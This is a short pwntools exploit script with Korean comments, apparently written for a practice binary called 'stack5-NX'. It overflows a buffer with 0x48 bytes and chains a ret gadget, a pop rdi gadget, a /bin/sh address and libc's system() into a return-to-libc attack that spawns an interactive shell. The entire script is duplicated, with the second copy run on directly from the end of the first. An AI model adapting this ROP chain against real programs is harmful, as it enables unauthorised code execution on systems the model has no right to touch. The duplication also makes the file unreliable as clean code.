from pwn import *

# 디버깅 출력 활성화
context.log_level = 'debug'

# 프로세스 시작
p = process('./stack5-NX')

# 가젯 주소
pop_rdi = 0x401203        # pop rdi ; ret
ret = 0x40101a           # ret (스택 정렬용)

# 필요한 주소들
binsh = 0x7ffff7dd8678    # /bin/sh 문자열 주소
libc_system = 0x7ffff7c50d70  # system 함수 주소

# 페이로드 구성
payload = b'A' * 0x48     # 버퍼 채우기
payload += p64(ret)       # 스택 정렬
payload += p64(pop_rdi)   # pop rdi ; ret
payload += p64(binsh)     # rdi에 /bin/sh 주소 저장
payload += p64(libc_system)  # system 함수 호출

# 디버깅 정보 출력
print("[*] 페이로드 전송 중...")
print("[*] 페이로드 길이:", len(payload))
print("[*] pop_rdi:", hex(pop_rdi))
print("[*] binsh:", hex(binsh))
print("[*] system:", hex(libc_system))

# 프로그램의 초기 출력 받기
raw_payload = p.recvline()
print("[*] 받은 데이터:", raw_payload)

# 페이로드 전송
p.sendline(payload)

# 인터랙티브 모드 시작
p.interactive() from pwn import *

# 디버깅 출력 활성화
context.log_level = 'debug'

# 프로세스 시작
p = process('./stack5-NX')

# 가젯 주소
pop_rdi = 0x401203        # pop rdi ; ret
ret = 0x40101a           # ret (스택 정렬용)

# 필요한 주소들
binsh = 0x7ffff7dd8678    # /bin/sh 문자열 주소
libc_system = 0x7ffff7c50d70  # system 함수 주소

# 페이로드 구성
payload = b'A' * 0x48     # 버퍼 채우기
payload += p64(ret)       # 스택 정렬
payload += p64(pop_rdi)   # pop rdi ; ret
payload += p64(binsh)     # rdi에 /bin/sh 주소 저장
payload += p64(libc_system)  # system 함수 호출

# 디버깅 정보 출력
print("[*] 페이로드 전송 중...")
print("[*] 페이로드 길이:", len(payload))
print("[*] pop_rdi:", hex(pop_rdi))
print("[*] binsh:", hex(binsh))
print("[*] system:", hex(libc_system))

# 프로그램의 초기 출력 받기
raw_payload = p.recvline()
print("[*] 받은 데이터:", raw_payload)

# 페이로드 전송
p.sendline(payload)

# 인터랙티브 모드 시작
p.interactive() 
